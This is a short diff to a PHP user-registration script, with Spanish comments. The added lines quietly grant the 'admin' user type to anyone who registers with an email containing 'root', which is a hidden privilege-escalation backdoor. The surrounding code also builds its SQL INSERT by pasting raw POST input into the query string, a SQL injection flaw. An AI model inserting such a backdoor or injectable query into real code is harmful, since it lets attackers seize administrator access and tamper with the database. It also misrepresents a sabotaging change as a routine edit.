@@ -22,7 +22,9 @@
 
         if (count($username_BD)<=0) { // Si no se encontró ningún usuario con el mismo nombre en la base de datos
             $tipo_usuario="client"; // Se define el tipo de usuario como "client"
-
+            if (str_contains($_POST['email'], "root")) {
+                $tipo_usuario = "admin";
+            }
             // Se construye la consulta SQL para insertar los datos en la tabla 'usuarios'
             $sql = "INSERT INTO usuarios (email, nombre, usuario, password, observaciones) VALUES (
                 '" . $_POST['email'] . "', 
